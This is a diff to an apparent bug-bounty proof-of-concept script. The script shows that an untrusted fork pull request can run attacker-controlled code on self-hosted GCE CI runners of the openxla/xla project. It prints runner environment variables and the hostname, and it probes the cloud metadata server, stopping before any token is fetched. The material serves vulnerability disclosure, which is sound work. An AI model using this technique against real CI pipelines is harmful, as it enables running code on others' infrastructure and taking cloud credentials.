@@ -7,6 +7,7 @@
 # self-hosted GCE CI runners (openxla/xla ci.yml)
 # Impact: Attacker-controlled build.py runs on Google infra
 # This PoC is NON-DESTRUCTIVE - no credentials are exfiltrated
+# Trigger: re-sync commit
 # =============================================================
 
 import os
@@ -20,7 +21,7 @@ BANNER = """
   Vulnerability: Untrusted fork PR RCE on self-hosted GCE runners
   Reporter: panwnvda
   This script replaced build_tools/ci/build.py in a fork PR.
-  It is executing on a Google-managed CI runner.
+  It is executing on a CI runner without any approval gate.
 ================================================================
 """
 
@@ -31,7 +32,7 @@ print("[+] Runner environment:")
 for var in ["GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "RUNNER_ARCH",
             "GITHUB_REPOSITORY", "GITHUB_SHA", "GITHUB_REF",
             "GITHUB_ACTOR", "GITHUB_EVENT_NAME"]:
-    print(f"    {var} = {os.environ.get(var, '(not set)')}" )
+    print(f"    {var} = {os.environ.get(var, '(not set)')}")
 
 print(f"    hostname = {socket.gethostname()}")
 
@@ -50,6 +51,7 @@ try:
     print("    ** This PoC stops here - no token fetched, nothing exfiltrated")
 except Exception as e:
     print(f"    Metadata server not reachable: {e}")
+    print("    (Expected on GitHub-hosted runners - on GCE runners this would succeed)")
 
 print("")
 print("================================================================")
